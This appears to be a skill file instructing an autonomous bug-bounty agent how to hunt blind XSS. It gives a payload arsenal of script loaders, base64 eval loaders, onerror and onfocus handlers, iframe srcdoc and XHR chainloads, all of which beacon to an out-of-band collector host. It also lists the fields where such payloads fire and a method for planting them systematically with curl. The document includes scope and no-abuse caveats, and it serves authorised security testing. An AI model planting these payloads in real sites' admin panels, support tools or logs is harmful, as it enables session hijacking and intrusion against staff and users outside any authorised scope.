---
name: bxss
description: "Blind / out-of-band XSS — planting payloads in fields rendered later in admin panels, support tools, log viewers, or any JS execution context you cannot directly observe. Beacons to the harness OOB canary ($AUTOHUNT_OOB)."
---

# /bxss — Blind XSS Hunting

> **Collector = your OOB canary.** Every payload below beacons to **`$AUTOHUNT_OOB`** (the canary host
> the harness exports; see TARGET.md). In the payloads, `OOB_HOST` means *the value of `$AUTOHUNT_OOB`* —
> substitute it before planting. **If `$AUTOHUNT_OOB` is not set, blind XSS cannot be confirmed
> autonomously** (you can't watch the admin browser): plant nothing you can't observe, and record the
> injection point as a **lead** instead. Never hardcode a personal/3rd-party collector here.

## Core philosophy

Blind XSS is a **patience + coverage** game — the payload fires hours/days later in a context you
never see. Two rules:
1. **Plant in every field that could be rendered server-side**, with a per-field tag so you know which
   input fired.
2. **Use a callback you can read.** Here that's `$AUTOHUNT_OOB`. Confirmation = an observed hit on the
   canary (poll it if it's an interactsh/oast-style host you can query); otherwise the planted payload
   is a **lead**, not a proven finding.

## Building the beacon (substitute OOB_HOST = $AUTOHUNT_OOB)

The loader (used by the encoded variants):
```
var a=document.createElement('script');a.src='https://OOB_HOST/?t=TAG';document.body.appendChild(a)
```
`TAG` = a short per-field identifier (e.g. `support-subject`). Build the base64 form at runtime so it
always points at your canary:
```
LOADER="var a=document.createElement('script');a.src='https://$AUTOHUNT_OOB/?t=support-subject';document.body.appendChild(a)"
B64=$(printf '%s' "$LOADER" | base64 -w0)
```
Then drop `$B64` into the `atob()` payloads below. (Do NOT ship pre-encoded blobs — they'd pin a stale host.)

## Payload arsenal — plant multiple styles per field (one may slip a filter another catches)

### 1. Basic `<script src>` — no script-tag filtering
```
"><script src="https://OOB_HOST/?t=TAG"></script>
```
### 2. `javascript:` URI — URL/link/redirect/href sinks
```
javascript:eval('var a=document.createElement("script");a.src="https://OOB_HOST/?t=TAG";document.body.appendChild(a)')
```
### 3. `<input autofocus>` + base64 loader — `<input>`/`onfocus` allowed, `<script>` stripped
```
"><input onfocus=eval(atob(this.id)) id=$B64 autofocus>
```
### 4. `<img onerror>` + base64 loader — `<img>` whitelisted (markdown/sanitizers)
```
"><img src=x id=$B64 onerror=eval(atob(this.id))>
```
### 5. `<video><source onerror>` + base64 loader — media-error chain
```
"><video><source onerror=eval(atob(this.id)) id=$B64>
```
### 6. `<iframe srcdoc>` with HTML-entity-encoded `<script>` — beats literal-`<script>` filters
   Build srcdoc by HTML-entity-encoding `<script src="https://OOB_HOST/?t=TAG"></script>` and placing it
   in `"><iframe srcdoc="&#…;">` (entities decode after parsing).
### 7. XMLHttpRequest inline chainload — inline scripts allowed, external `src` blocked
```
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load",b);a.open("GET","https://OOB_HOST/?t=TAG");a.send();</script>
```
### 8. jQuery `$.getScript()` — smallest, for jQuery sites
```
<script>$.getScript("https://OOB_HOST/?t=TAG")</script>
```
### Others when none fire
- SVG upload: `<svg xmlns="http://www.w3.org/2000/svg" onload="...">` as avatar/attachment
- Attribute breakout: `' autofocus onfocus='eval(atob(...))`
- JS-context escape: `';fetch('//OOB_HOST/?t=TAG');//`
- Markdown/BBCode: `[img]javascript:...[/img]`
- DOM-clobbering (AngularJS-ish): `<form id=test><input id=attributes>`

### Tagging
Encode the field/endpoint id in the `?t=` suffix so a fired callback maps back to the input
(`?t=support-subject`). Untagged callbacks are useless when many payloads are out at once.

## High-yield fields (where bXSS fires)

**User-controlled, rendered in admin/staff tools:** display/full name, company, bio, job title; support
ticket subject+body; contact/feedback forms; bug reports; order/shipping/billing notes; uploaded
filename (file-explorer admin views); custom fields/tags/labels; SVG avatars (often rendered raw);
webhook URLs (rendered as links).

**HTTP fields logged into dashboards:** `User-Agent` (very common), `Referer`, `X-Forwarded-For` and any
`X-*` header, request path/query (404/security logs), cookie names, failed-login username (audit logs).

**Indirect / second-order:** payload in email local-part (`"><script src=...>"@example.com`), loosely
validated phone numbers, domains submitted to whitelist forms, referral/invite codes.

## Methodology (autonomous / CLI)

1. **Canary:** confirm `$AUTOHUNT_OOB` is set (TARGET.md). If not → blind XSS is **lead-only**; still log
   high-value injection points for a human.
2. **Inventory the input surface** (curl/httpx + JS-bundle mining via the `/xss` techniques). The fields
   **never echoed back to you** are the prime bXSS candidates (they're echoed *to staff*).
3. **Plant systematically** with curl — one tagged payload set per field; pass the firewall rate caps
   from TARGET.md; don't wait between fields.
4. **Confirm:** if `$AUTOHUNT_OOB` is pollable (interactsh/oast), poll it for hits and correlate the `?t=`
   tag → input → admin context. An observed hit is the oracle → finding. No observable hit → **lead**.

## Post-fire (only when you actually observe a callback)

DOM/cookies/URL/roles may arrive with the hit. Identify the admin app, note an admin session's presence
(don't abuse it), capture internal URLs (new scope). Use any captured session ONLY to demonstrate
benign read (whoami/profile), then stop — never exfiltrate real admin data.

## Key considerations
- Many programs scope OUT staff/admin accounts — read the policy; in-scope admin XSS is often critical.
- Capture proof-of-execution (callback hit, cookie *name* presence, URL, fingerprint) — never bulk data.
- Silent beacons only — no `alert()`/UI-disrupting payloads in someone else's admin panel.
- One bXSS in an admin tool → look harder; the same UI usually has more sinks.
- Reporting/Discord are the orchestrator's job — you write the report via `/report-yeswehack` only.
